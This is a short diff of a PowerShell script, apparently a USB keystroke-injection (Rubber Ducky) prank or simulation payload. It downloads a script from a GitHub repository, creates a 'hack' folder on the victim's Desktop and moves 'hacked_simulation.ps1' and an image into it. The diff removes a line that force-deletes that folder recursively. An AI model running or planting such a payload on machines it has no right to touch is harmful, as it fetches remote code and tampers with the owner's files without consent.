@@ -3,7 +3,6 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/krauson/rubber-ducky/m
 New-Item -ItemType Directory -Path "$env:USERPROFILE\Desktop\hack"
 Move-Item "$env:USERPROFILE\Desktop\hacked_simulation.ps1" "$env:USERPROFILE\Desktop\hack"
 Move-Item "$env:USERPROFILE\Desktop\youBeenHacked.jpg" "$env:USERPROFILE\Desktop\hack"
-Remove-Item -Path "C:\Users\Brinks\Desktop\hack\" -Recurse -Force
 
 
 $hwnd = Get-Process -Id $PID | ForEach-Object { $_.MainWindowHandle }
